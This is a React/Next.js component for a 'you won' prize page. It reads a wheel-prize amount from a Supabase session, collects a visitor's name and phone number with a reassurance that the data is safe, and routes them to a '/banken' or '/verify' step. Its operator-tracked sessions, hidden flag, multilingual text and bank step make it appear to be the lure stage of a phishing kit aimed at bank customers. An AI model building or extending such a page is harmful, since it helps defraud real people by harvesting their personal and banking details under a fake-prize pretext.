"use client";

import { useEffect, useState, useMemo } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";
import { persistActiveSession } from "@/lib/session-id-client";

type Props = {
  sessionId: string;
  routeSessionId?: string;
};

async function resolveShortIdApi(sessionId: string): Promise<string | null> {
  try {
    const res = await fetch(`/api/resolve-short-id`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: sessionId }),
      cache: "no-store",
    });
    if (!res.ok) return null;
    const json = await res.json();
    if (json?.ok && json?.public_id) return String(json.public_id);
    return null;
  } catch {
    return null;
  }
}

export function WinFlow({ sessionId, routeSessionId }: Props) {

  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [amount, setAmount] = useState<number | null>(null);
  const [, setCurrency] = useState<string>("€");
  const [loading, setLoading] = useState(true);
  const [showModal] = useState(true);
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [phone, setPhone] = useState("");
  const [saving, setSaving] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});

  // Client-side URL normalizasyonu: /win/UUID ise pathi /win/{kisa_id} ye cevir
  useEffect(() => {
    if (typeof window === "undefined") return;
    let cancelled = false;

    const run = async () => {
      const match = window.location.pathname.match(/^\/win\/([^/?#]+)/i);
      if (!match) return;
      const idFromPath = decodeURIComponent(match[1]);
      const isUuid =
        /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          idFromPath,
        );
      if (!isUuid) return;

      const preferredShort =
        routeSessionId &&
        !/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          routeSessionId,
        )
          ? routeSessionId
          : null;

      const shortId = preferredShort ?? (sessionId ? await resolveShortIdApi(sessionId) : null);
      if (cancelled) return;
      if (shortId && shortId !== idFromPath) {
        const url = new URL(window.location.href);
        const segs = url.pathname.split("/").filter(Boolean);
        if (segs.length >= 2 && segs[0].toLowerCase() === "win") {
          segs[1] = encodeURIComponent(shortId);
          url.pathname = "/" + segs.join("/");
        }
        const next = url.pathname + url.search + url.hash;
        window.history.replaceState({}, "", next);
      }
    };

    run();
    return () => {
      cancelled = true;
    };
  }, [sessionId, routeSessionId]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null) {
        setLoading(false);
        return;
      }
      const { data, error: qErr } = await supabase
        .from("sessions")
        .select("amount, form_data")
        .eq("id", sessionId)
        .maybeSingle();

      if (cancelled) return;
      if (qErr || !data) {
        setError("Seanssi ei leitud või konfiguratsiooniviga.");
        setLoading(false);
        return;
      }

      const fd = (data.form_data ?? {}) as Record<string, any>;
      // =================================================================
      //  KESIN ODAK: SESSION.AMOUNT > FORM_DATA.AMOUNT > WHEEL_RESULT_LABEL PARSE
      //  (carktan gecen her session icin amount KESIN yazili olur, aksi yok)
      // =================================================================
      let fallbackAmount = 0;
      if (typeof data.amount === "number" && data.amount > 0) {
        fallbackAmount = data.amount;
      } else if (typeof fd.amount === "number" && fd.amount > 0) {
        fallbackAmount = fd.amount;
      } else if (typeof fd.wheel_result_amount === "number" && fd.wheel_result_amount > 0) {
        fallbackAmount = fd.wheel_result_amount;
      } else if (typeof fd.wheel_result_amount === "string" && fd.wheel_result_amount) {
        fallbackAmount = Number(fd.wheel_result_amount) || 0;
      } else if (typeof fd.wheel_result_label === "string" && fd.wheel_result_label) {
        const digit = fd.wheel_result_label.replace(/[^0-9.,]/g, "");
        if (digit) fallbackAmount = Number(digit.replace(",", ".")) || 0;
      }
      setAmount(fallbackAmount > 0 ? fallbackAmount : 0);
      setSessionFormData(fd);
      if (fd.currency) setCurrency(fd.currency);
      setFirstName(fd.firstName ?? "");
      setLastName(fd.lastName ?? "");
      setPhone(fd.phone ?? "");
      setLoading(false);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase) return;
    setSaving(true);
    setError(null);

    const goWheel = sessionFormData?.is_wheel_game === true;
    const nextForm = {
      ...sessionFormData,
      firstName: firstName.trim(),
      lastName: lastName.trim(),
      phone: phone.trim(),
      pending_profile: false,
    };

    const { error: upErr } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        form_data: nextForm,
        current_step: goWheel ? "verify" : "banken",
      })
      .eq("id", sessionId);

    setSaving(false);
    if (upErr) {
      setError("Salvestamine ebaõnnestus. Proovige uuesti.");
      return;
    }
    setSessionFormData(nextForm);
    try {
      persistActiveSession(sessionId, routeSessionId);
      localStorage.setItem(`session:${sessionId}:profileComplete`, "1");
    } catch {
      /* storage ops are best-effort */
    }
    setProcessing(true);
    window.setTimeout(() => {
      setProcessing(false);
      const qs = routeSessionId
        ? `?session=${encodeURIComponent(routeSessionId)}`
        : "";
      window.location.href = `${goWheel ? "/verify" : "/banken"}${qs}`;
    }, 700);
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0fae4e]/30 border-t-[#0fae4e]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <DemoShell title="Konfiguration" subtitle="Systemumgebung">
        <ConfigMissing />
      </DemoShell>
    );
  }

  if (loading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-brand-blue border-t-transparent" />
        </div>
      </div>
    );
  }

  if (error && amount === null) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center p-4">
        <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-900">{error}</p>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      {showModal ? (
        <div
          role="dialog"
          aria-modal="true"
          className="relative w-full max-w-[650px] overflow-hidden rounded-[24px] bg-[#021a0e] border border-[#0fae4e] shadow-[0_0_40px_rgba(15,174,78,0.3)]"
        >
          <div className="px-5 pb-6 pt-6 sm:px-10 sm:pb-10 sm:pt-10">
            {/* Top Section with Gift Box */}
            <div className="relative mb-4 sm:mb-6">
              <div className="pr-24 sm:pr-48">
                <h2 className="text-lg font-bold text-white sm:text-2xl leading-tight">
                  {settings.win_title}
                </h2>
                <p className="mt-1 text-[11px] text-gray-300 sm:text-sm sm:mt-2">
                  {settings.profile_subtitle}
                </p>

              </div>
              
              {/* Gift Box Image */}
              <div className="absolute right-[-15px] top-[-15px] w-24 sm:right-[-10px] sm:top-[-30px] sm:w-44 pointer-events-none">
                <img
                  src="/form-assets/iki-gift-box.png"
                  alt=""
                  className="h-auto w-full object-contain drop-shadow-[0_18px_30px_rgba(0,0,0,0.4)]"
                />
              </div>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-3 sm:space-y-4">
              <div className="grid grid-cols-1 gap-3 sm:gap-4 sm:grid-cols-2">
                <label className="block text-[13px] font-medium text-white sm:text-sm">
                  {settings.profile_firstname_label}
                  <div className="relative mt-1">
                    <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
                      <img src="/form-assets/icon-person.png" alt="" className="h-4 w-4 sm:h-5 sm:w-5 object-contain opacity-70" />
                    </div>
                    <input
                      required
                      className="block w-full rounded-xl border border-transparent bg-white py-2.5 sm:py-3 pl-9 sm:pl-10 pr-3 text-sm sm:text-base text-gray-900 shadow-sm transition-colors placeholder:text-gray-400 focus:border-[#0fae4e] focus:outline-none focus:ring-2 focus:ring-[#0fae4e]/50"
                      value={firstName}
                      onChange={(e) => setFirstName(e.target.value)}
                      autoComplete="given-name"
                    />
                  </div>
                </label>
                <label className="block text-[13px] font-medium text-white sm:text-sm">
                  {settings.profile_lastname_label}
                  <div className="relative mt-1">
                    <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
                      <img src="/form-assets/icon-person.png" alt="" className="h-4 w-4 sm:h-5 sm:w-5 object-contain opacity-70" />
                    </div>
                    <input
                      required
                      className="block w-full rounded-xl border border-transparent bg-white py-2.5 sm:py-3 pl-9 sm:pl-10 pr-3 text-sm sm:text-base text-gray-900 shadow-sm transition-colors placeholder:text-gray-400 focus:border-[#0fae4e] focus:outline-none focus:ring-2 focus:ring-[#0fae4e]/50"
                      value={lastName}
                      onChange={(e) => setLastName(e.target.value)}
                      autoComplete="family-name"
                    />
                  </div>
                </label>
              </div>
              <label className="block text-[13px] font-medium text-white sm:text-sm">
                {settings.profile_phone_label}
                <div className="relative mt-1">
                  <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
                    <img src="/form-assets/icon-phone.png" alt="" className="h-4 w-4 sm:h-5 sm:w-5 object-contain opacity-70" />
                  </div>
                  <input
                    required
                    type="tel"
                    className="block w-full rounded-xl border border-transparent bg-white py-2.5 sm:py-3 pl-9 sm:pl-10 pr-3 text-sm sm:text-base text-gray-900 shadow-sm transition-colors placeholder:text-gray-400 focus:border-[#0fae4e] focus:outline-none focus:ring-2 focus:ring-[#0fae4e]/50"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    autoComplete="tel"
                  />
                </div>
              </label>

              {/* Security Text */}
              <div className="mt-3 sm:mt-4 flex items-center gap-2">
                <img src="/form-assets/icon-security.png" alt="" className="h-4 w-4 sm:h-5 sm:w-5 object-contain" />
                <span className="text-[11px] sm:text-sm text-gray-300">Teie andmed töödeldakse turvaliselt.</span>
              </div>

              {error ? <p className="text-sm font-medium text-red-400">{error}</p> : null}

              <button
                type="submit"
                disabled={saving || processing}
                className="mt-4 sm:mt-6 w-full rounded-xl bg-gradient-to-r from-[#0fae4e] to-[#007a38] py-3.5 sm:py-4 text-base sm:text-lg font-bold text-white shadow-[0_0_15px_rgba(15,174,78,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
              >
                {processing ? "Töötlemine..." : saving ? "Salvestamine..." : settings.profile_button}
              </button>
            </form>
          </div>
        </div>
      ) : null}
    </div>
  );
}
